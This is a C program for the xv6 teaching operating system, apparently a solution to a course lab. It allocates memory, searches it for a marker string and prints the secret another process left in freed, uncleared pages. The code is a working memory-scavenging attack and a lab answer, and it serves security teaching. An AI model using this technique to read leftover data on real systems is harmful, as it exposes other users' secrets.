#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define SIZE (8192 * 4096)
#define HELP_LENGTH 14
#define MAXSTRLEN 256
#define DEBUGLEN 64

int
main (int argc, char *argv[])
{
  char *addr = sbrk (SIZE);

  if (addr == (char *)-1)
    {
      printf ("attack: sbrk failed, not enough memory\n");
      exit (1);
    }

  for (int i = 0; i < SIZE - HELP_LENGTH; i++)
    {
      if (memcmp (&addr[i], "This may help.", HELP_LENGTH) == 0)
        {
          char buf[MAXSTRLEN] = { 0 };
          char *secret_ptr = &addr[i + 16];
          int len = 0;
          int unprintable_count = 0;
          int unprintable_location[MAXSTRLEN] = { 0 };

          // Debug section
          // printf ("DEBUG SECTION----------------------\n");
          // printf ("Found marker at offset %d\n", i);
          // printf ("Raw bytes at +16: ");
          // for (int debug = i; debug < DEBUGLEN + i; debug++)
          //   {
          //     printf ("%x ", (unsigned char)addr[debug]);
          //   }
          // printf ("\nASCII: ");
          // for (int debug = i; debug < DEBUGLEN + i; debug++)
          //   {
          //     printf ("%c ", (unsigned char)addr[debug]);
          //   }
          // printf ("\n");
          // Debug section ends

          for (int j = 0; j < MAXSTRLEN && (i + 16 + j) < SIZE; j++)
            {
              char c = secret_ptr[j];
              if (c == 0)
                {
                  break;
                }
              if (c >= 32 && c <= 126) // if printable
                {
                  buf[len++] = c;
                }
              else
                {
                  unprintable_location[unprintable_count++] = len;
                  buf[len++] = c;
                }
            }

          // Debug section
          // printf ("Extracted %d characters\n", len);
          // printf ("DEBUG SECTION ENDS----------------------\n");
          // Debug section ends

          if (len == 0)
            {
              printf ("attack: keyword found but no printable data, try run "
                      "attack again. If attack succeeded before, running it "
                      "again will also rise this error message\n");
              exit (0);
            }
          else if (unprintable_count != 0)
            {
              printf ("attack: WARNING, output contains %d unprintable "
                      "characters. Location at: ",
                      unprintable_count);
              for (int index = 0; index < unprintable_count; index++)
                {
                  printf ("%d ", unprintable_location[index]);
                }
              printf ("\n");
              buf[len] = 0;
              for (int k = 0; k < len; k++)
                {
                  printf ("%c", buf[k]);
                }
              printf ("\n");
              exit (0);
            }
          else
            {
              buf[len] = 0;
              for (int k = 0; k < len; k++)
                {
                  printf ("%c", buf[k]);
                }
              printf ("\n");
              exit (0);
            }
        }
    }

  printf ("attack: string not found, SIZE might be too small, or try run "
          "attack again\n");
  exit (0);
}
